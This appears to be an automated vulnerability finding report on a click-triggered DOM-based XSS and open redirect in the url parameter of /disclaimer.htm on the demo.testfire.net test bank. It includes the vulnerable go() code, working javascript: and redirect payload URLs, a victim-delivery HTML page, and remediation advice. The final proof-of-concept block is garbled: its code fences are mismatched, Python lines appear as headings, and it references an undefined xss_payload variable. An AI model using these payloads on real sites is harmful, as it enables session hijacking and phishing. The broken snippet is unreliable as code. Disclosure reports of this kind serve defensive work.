# DOM-Based XSS and Open Redirect via the url Parameter in /disclaimer.htm

**ID:** vuln-0017
**Severity:** MEDIUM
**Found:** 2026-09-20 21:49:41 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /disclaimer.htm
**Method:** GET
**CWE:** CWE-79
**CVSS:** 5.4
**Confidence:** High
**Fix Effort:** Low

## Description

The `disclaimer.htm` page takes the entire substring after `url=` from its own address and assigns it directly to `window.location.href` when the user clicks the "OK" image. The value is not validated against a scheme or host allowlist, so an attacker can supply `javascript:` URIs, which execute script in the demo.testfire.net origin, or an arbitrary external URL that redirects the user off-site.

## Evidence

After clicking the "OK" image on the crafted page, script executed in the origin (document title changed from the page title to `1`):

```text
GET /disclaimer.htm?url=javascript:document.title=1
(browser title) Altoro Mutual: Link Disclaimer  ->  after clicking OK: "1"
```

Arbitrary DOM mutation through the encoded payload, proving general script execution (not just a title side effect):

```text
GET /disclaimer.htm?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29
click OK
document.body.getAttribute('data-y')  ->  "OK9"
```

Unvalidated cross-origin redirect (same sink, `http:` scheme):

```text
GET /disclaimer.htm?url=http://example.com/
click OK
final URL   -> https://example.com/
page title  -> Example Domain
```

## Impact

Script supplied through the `url` parameter runs in the application's origin after a single click, letting an attacker act as the victim: read the non-HttpOnly `AltoroAccounts` cookie, issue authenticated same-origin requests (for example perform transfers or account actions), and render arbitrary content under the bank's domain for phishing. The same parameter also performs an unvalidated redirect to an arbitrary external host, enabling phishing and the theft of tokens/referrers on the trusted domain.

## Counterevidence

Checked whether the reflection in the page body is the actual sink: the body uses `document.write(encodeURI(sDst))`, which percent-encodes `<` and `>`, so a raw HTML/XSS payload there does not execute and the body reflection is not exploitable — the execution is specifically via the `location.href` assignment. Also verified the scheme cannot be assumed safe: `javascript:` does not match the `sDst.indexOf("http")==0` auto-redirect branch, yet still reaches the `location.href` sink, so the only guard (hostname substring for same-domain http links) does not cover it. Confirmed execution is not a side effect of test tooling — the standard `location.href='javascript:...'` assignment executed (attribute set to `MARKER123`), and the real OK-button path executed for both payloads. The residual constraint is the required click (UI:R), reflected in the rating.

## What Would Change This Severity

Removing the required click (for example if a version auto-navigates for these values) would raise this to a zero-interaction reflected XSS (higher severity); conversely, restricting the sink to same-origin http links with a strict scheme check would remove the javascript: execution and leave at most a low-severity open redirect.

## Technical Analysis

`disclaimer.htm` contains an inline `go()` function that is invoked when the user clicks the "OK" image:

```javascript
function go() {
    var iPos = document.URL.indexOf("url=")+4;
    var sDst = document.URL.substring(iPos,document.URL.length);
    if (window.opener) {
        window.opener.location.href = sDst;
        cl();
    } else {
        window.location.href = sDst;
    }
}
```

`sDst` is taken verbatim from the current address and assigned to `window.location.href` with no scheme or host validation. Assigning a `javascript:` URI to `location.href` executes it in the current document's origin, and assigning an `http(s):` URL navigates to that host.

Payloads (the browser exposes the URL portion percent-encoded, so characters such as `(`, `)` and quotes must be pre-encoded in the crafted link):

```text
http://demo.testfire.net/disclaimer.htm?url=javascript:document.title=1
http://demo.testfire.net/disclaimer.htm?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29
http://demo.testfire.net/disclaimer.htm?url=http://example.com/
```

The page also writes the target into the body via `document.write(encodeURI(sDst))`; because `encodeURI` percent-encodes the angle brackets, that reflection is not itself exploitable — the execution occurs through the `location.href` sink. Note an auto-redirect branch exists only for `http` values that contain the application's own hostname, so cross-origin or `javascript:` values are not filtered, only deferred to the click.

## Proof of Concept

1. Deliver the crafted link `http://demo.testfire.net/disclaimer.htm?url=javascript:document.title=1` to a victim.
2. The victim lands on the trusted disclaimer page and clicks the "OK" image.
3. `go()` assigns the `url` value to `window.location.href`; the `javascript:` payload executes and the document title becomes `1`.
4. To demonstrate code execution with a side effect that survives the encoded URL, use `?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29`; after clicking OK the attribute `data-y="OK9"` is present on the body, proving arbitrary script execution in the page origin.
5. For the redirect variant, browse to `http://demo.testfire.net/disclaimer.htm?url=http://example.com/` and click OK; the browser navigates to `https://example.com/`.

````html
<!-- Deliver this page to the victim; the link is on the trusted bank domain. -->
<!doctype html>
<html>
  <body>
    <p>Please confirm</p>
    <!-- javascript: payload (executes in demo.testfire.net origin on OK) -->
    <a href="http://demo.testfire.net/disclaimer.htm?url=javascript:document.body.setAttribute%28%27data-y%27%2C%27OK9%27%29">
      Open trusted page
    </a>
    <!-- open-redirect payload -->
    <a href="http://demo.testfire.net/disclaimer.htm?url=http://example.com/">
      Open redirect
    </a>
  </body>
</html>
```

# Verification of the executed payloads against a running instance

from urllib.parse import quote

BASE = "http://demo.testfire.net/disclaimer.htm?url="

# Executes JS in the demo.testfire.net origin once the user clicks OK.

print(BASE + xss_payload)

# Unvalidated redirect to an arbitrary external host.
print(BASE + "http://example.com/")
````

## Remediation

Do not assign user-controlled input to `window.location.href`. Validate the destination against a strict allowlist: accept only absolute `https:` URLs whose host is an expected destination, reject all other schemes (`javascript:`, `data:`, `vbscript:`) and protocol-relative values, and compare the parsed host (after canonicalization) rather than a substring. Where only known links are expected, map link identifiers to fixed destinations server-side instead of passing the target in the URL. Add a Content-Security-Policy that disallows inline script to further reduce the impact of any residual DOM injection.

## Assumptions

Assumes the victim follows a crafted link to the trusted `demo.testfire.net` domain and clicks the "OK" image on the disclaimer page (one user interaction). No authentication is required to reach the page.
